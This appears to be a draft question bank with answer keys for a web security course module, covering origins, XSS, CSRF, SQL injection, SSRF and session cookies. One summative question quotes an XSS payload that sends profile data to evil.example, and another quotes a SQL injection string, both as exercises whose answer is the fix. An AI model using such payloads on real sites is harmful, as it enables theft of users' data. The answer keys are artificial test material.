---
id: security/web-security
title: Web Security
band: B4
track: security
tier: T2
bloom_target: apply
prerequisites: [security/authentication-authorization, systems-software/http-basics]
related: [security/threat-modeling, security/secure-sdlc]
recommended: []
status: draft
schema-version: 1
owner: l1-web-security
reviewed-by: []
updated: 2026-08-18
sources: [S-0017, S-0019, S-0023, S-0247, S-0248, S-0249]
---

# Web Security — validation

## Formative (practice)

- Q: Which three components define an origin, and what is the origin of https://shop.example.com:8443/a/b?
- bloom: remember
- bank: formative
- A: Scheme, host, and port: https, shop.example.com, 8443. The path does not participate, and an explicit default port is normalized.
- evidence: [S-0249]
- topic: security/web-security

- Q: Why does the same-origin policy permit cross-origin requests but forbid cross-origin reads?
- bloom: understand
- bank: formative
- A: Sending requests is required for the web to work (links, forms, APIs), while reading another origin's data would let malicious sites exfiltrate victims' information; resources can opt into reads (e.g., CORS). This asymmetry is what CSRF exploits.
- evidence: [S-0249]
- topic: security/web-security

- Q: Name the three generally recognized forms of XSS and where each payload is injected.
- bloom: understand
- bank: formative
- A: Reflected (echoed from the request in the server response), stored (persisted server-side, served to later viewers), and DOM-based (injected client-side into a sink like innerHTML, never reaching the server).
- evidence: [S-0248]
- topic: security/web-security

- Q: Why does a Content-Security-Policy not eliminate the need for output encoding?
- bloom: understand
- bank: formative
- A: CSP restricts which content can execute (inline scripts, remote scripts, eval) — it is a containment layer; encoding prevents the injection in the first place, and OWASP lists sole reliance on CSP as an anti-pattern.
- evidence: [S-0248]
- topic: security/web-security

## Summative (mastery checkpoint)

- Q: Given `SELECT * FROM items WHERE id = "` + userId + `"`, harden the query and explain why the fix works.
- bloom: apply
- bank: summative
- A: Replace concatenation with a parameterized query (prepared statement): the statement skeleton and the value travel separately, so a value like `" OR "1"="1` is data, never SQL structure. Secondary: allow-list validation of the expected format; never rely on escaping.
- evidence: [S-0248]
- topic: security/web-security

- Q: A state-changing POST endpoint is vulnerable to CSRF. Choose and justify the mitigations to deploy.
- bloom: apply
- bank: summative
- A: Deploy a server-generated synchronizer token embedded in the form and validated on submission (the attacker page cannot read it); set SameSite=Strict/Lax on the session cookie (browser suppresses cross-site sends); keep the cookie HttpOnly+Secure. Tokens stop the forged request; SameSite stops the cookie from traveling at all.
- evidence: [S-0248][S-0249]
- topic: security/web-security

- Q: A search page renders the user's query in the HTML body. The payload `<script>fetch('/profile').then(r=>r.text()).then(t=>fetch('//evil.example/?d='+t))</script>` executes. Fix it and state which XSS form this is.
- bloom: apply
- bank: summative
- A: Reflected XSS. Fix: HTML-body context encoding of the untrusted value when rendering (and prefer safe sinks); add CSP as defense in depth; HttpOnly session cookies limit what the payload can exfiltrate. Verify the fix by submitting the payload and confirming it renders as text.
- evidence: [S-0248]
- topic: security/web-security

- Q: A "preview this URL" feature fetches user-supplied URLs server-side. Apply SSRF mitigations.
- bloom: apply
- bank: summative
- A: Validate with a positive allow-list: allowed schemes (https only), allowed host destinations, allowed ports; reject private/link-local/metadata ranges (or proxy outbound fetches through a network segment with deny-by-default rules); disable redirects or re-validate after redirect; never use a deny-list alone.
- evidence: [S-0247]
- topic: security/web-security

## Review (spaced repetition — interleaved with prerequisites)

- Q: Which cookie attributes protect a session cookie, and what does each prevent?
- bloom: understand
- bank: review
- A: HttpOnly — script cannot read the ID (blocks session theft via XSS); Secure — only sent over HTTPS (blocks interception on plain HTTP); SameSite=Strict/Lax — not sent on cross-site requests (CSRF defense).
- evidence: [S-0248]
- topic: security/authentication-authorization

- Q: What is the Host header's role in HTTP/1.1, and what would routing break without it?
- bloom: remember
- bank: review
- A: The Host header is mandatory in HTTP/1.1 and identifies the target authority, enabling virtual hosting of many origins on one server; without it the server cannot disambiguate which origin a request targets.
- evidence: [S-0093]
- topic: systems-software/http-basics

- Q: Why must a session identifier be regenerated after login?
- bloom: understand
- bank: review
- A: The pre-login ID may have been fixed by an attacker (session fixation); regenerating after privilege change severs the attacker's handle to the now-authenticated session.
- evidence: [S-0248]
- topic: security/authentication-authorization

- Q: Where in STRIDE does XSS land, and why does that explain its severity?
- bloom: understand
- bank: review
- A: Information disclosure (and elevation of privilege when the injected script acts with the origin's authority) — the script inherits the victim's session and privileges, which is why XSS can do anything the user can do.
- evidence: [S-0237]
- topic: security/threat-modeling
